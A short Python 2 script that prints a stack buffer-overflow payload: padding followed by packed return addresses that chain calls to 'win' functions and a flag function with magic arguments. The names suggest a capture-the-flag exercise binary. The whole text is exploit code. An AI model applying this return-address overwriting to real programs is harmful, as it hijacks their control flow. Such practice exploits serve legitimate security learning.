#!/usr/bin/python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
winFunctionAddress = struct.pack("I", 0x80485cb)

winFunction2Address = struct.pack("I", 0x80485d8)
winFunction2Arg = struct.pack("I", 0xBAAAAAAD)

flagAddress = struct.pack("I", 0x804862b)
flagArg = struct.pack("I", 0xDEADBAAD)

print padding + winFunctionAddress + winFunction2Address + flagAddress + winFunction2Arg + flagArg